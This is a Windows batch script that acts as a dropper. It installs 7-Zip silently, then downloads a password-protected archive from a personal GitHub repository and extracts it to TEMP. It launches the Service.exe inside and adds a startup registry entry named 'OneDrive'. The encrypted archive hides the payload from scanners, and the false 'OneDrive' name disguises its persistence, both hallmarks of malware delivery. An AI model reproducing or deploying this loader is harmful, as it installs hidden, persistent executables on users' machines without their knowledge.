@echo off
setlocal

:: === CONFIGURATION ===
set "zipUrl=https://github.com/Andre0194/service/raw/refs/heads/master/service.7z"                       :: Direct URL for the service.7z file
set "zipPath=%TEMP%\service.7z"                                :: Path to save the downloaded 7z file in TEMP
set "password=*#Slayerx@123plesk"                              :: Password for the service.7z file
set "sevenZipDir=%LOCALAPPDATA%\7-Zip"                         :: User-writable directory
set "sevenZip=%sevenZipDir%\7z.exe"                            :: 7z.exe path in user space
set "installUrl=https://www.7-zip.org/a/7z1900-x64.exe"        :: 7-Zip installer URL (64-bit version)
set "installerPath=%TEMP%\7z_installer.exe"

:: === STEP 1: CHECK AND INSTALL 7-ZIP LOCALLY IF NEEDED ===
echo 🔍 Checking for 7-Zip in user directory...

if exist "%sevenZip%" (
    echo ✅ 7-Zip already installed at %sevenZip%.
) else (
    echo ⬇️ 7-Zip not found. Downloading installer...
    powershell -Command "Invoke-WebRequest -Uri '%installUrl%' -OutFile '%installerPath%' -UseBasicParsing"
    
    echo 🛠️ Installing 7-Zip to %sevenZipDir%...
    start /wait "" "%installerPath%" /S /D="%sevenZipDir%"

    if not exist "%sevenZip%" (
        echo ❌ Failed to install 7-Zip at user path.
        exit /b 1
    )
    echo ✅ 7-Zip installed locally at %sevenZip%.
)

:: === STEP 2: DOWNLOAD service.7z FILE ===
echo 📥 Downloading service.7z...
powershell -Command "Invoke-WebRequest -Uri '%zipUrl%' -OutFile '%zipPath%' -UseBasicParsing -ErrorAction Stop"
if %ERRORLEVEL% neq 0 (
    echo ❌ Failed to download service.7z
    exit /b 1
)
echo ✅ service.7z downloaded to %zipPath%.

:: === STEP 3: EXTRACT USING LOCAL 7-ZIP ===
echo 📦 Extracting service.7z to TEMP...
"%sevenZip%" x "%zipPath%" -p%password% -o"%TEMP%" -y
if %ERRORLEVEL% neq 0 (
    echo ❌ Extraction failed.
    exit /b 1
)
echo ✅ Extraction completed.

:: === STEP 4: RUN Service.exe IF EXISTS ===
set "exeFilePath=%TEMP%\Service.exe"
if exist "%exeFilePath%" (
    echo 🚀 Launching Service.exe...
    timeout /t 2 /nobreak >nul
    start "" "%exeFilePath%" >nul 2>&1
    if %ERRORLEVEL% neq 0 (
        echo ❌ Failed to start Service.exe
        exit /b 1
    )
    echo ✅ Service.exe started.

    :: === STEP 5: ADD TO STARTUP VIA REGISTRY (CURRENT USER) ===
    echo 📝 Adding Service.exe to startup via registry...
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OneDrive" /t REG_SZ /d "\"%TEMP%\Service.exe\"" /f
    if %ERRORLEVEL% neq 0 (
        echo ❌ Failed to add registry startup entry.
        exit /b 1
    )
    echo ✅ Startup entry added.

) else (
    echo ❌ Service.exe not found in TEMP.
    dir "%TEMP%"
    exit /b 1
)

endlocal
